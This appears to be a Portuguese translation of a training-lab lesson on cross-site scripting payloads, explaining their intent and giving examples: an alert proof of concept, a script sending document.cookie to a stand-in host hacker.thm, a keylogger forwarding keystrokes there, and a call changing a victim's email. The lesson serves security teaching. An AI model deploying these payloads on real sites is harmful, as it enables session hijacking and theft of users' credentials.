O que é uma carga útil?

Em um ataque XSS , a carga útil é o código JavaScript que desejamos executar no computador do alvo. A carga útil possui duas partes: a intenção e a modificação.



A intenção é o que você deseja que o JavaScript realmente faça (o que abordaremos com alguns exemplos abaixo), e a modificação são as alterações no código necessárias para que ele seja executado, já que cada cenário é diferente (mais sobre isso na tarefa de aprimoramento do seu payload).



Aqui estão alguns exemplos de intenções de XSS .



Prova de conceito:

Este é o tipo mais simples de payload, onde o objetivo é apenas demonstrar que é possível realizar um ataque XSS em um site. Isso geralmente é feito exibindo uma caixa de alerta na página com uma sequência de texto, por exemplo:



<script>alert('XSS');</script>



Roubo de sessão:

Detalhes da sessão de um usuário, como tokens de login, geralmente são armazenados em cookies no computador do alvo. O código JavaScript abaixo captura o cookie do alvo, codifica-o em base64 para garantir a transmissão bem-sucedida e, em seguida, o envia para um site controlado pelo hacker para que o usuário faça login. Uma vez que o hacker tenha esses cookies, ele pode assumir o controle da sessão do alvo e fazer login como esse usuário.



<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>



Keylogger:

O código abaixo funciona como um keylogger. Isso significa que tudo o que você digitar na página da web será encaminhado para um site controlado pelo hacker. Isso pode ser muito prejudicial se o site onde o código malicioso foi instalado aceitar logins de usuários ou dados de cartão de crédito.



<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>



Lógica de negócio:

Essa carga útil é muito mais específica do que os exemplos acima. Ela se refere à chamada de um recurso de rede específico ou de uma função JavaScript. Por exemplo, imagine uma função JavaScript para alterar o endereço de e-mail do usuário chamada `email_address` user.changeEmail(). Sua carga útil poderia ser assim:



<script>user.changeEmail('attacker@hacker.thm');</script>



Agora que o endereço de e-mail da conta foi alterado, o invasor pode realizar um ataque de redefinição de senha.


As próximas quatro tarefas abordarão os diferentes tipos de vulnerabilidades XSS , cada uma exigindo payloads de ataque e interação do usuário ligeiramente diferentes.
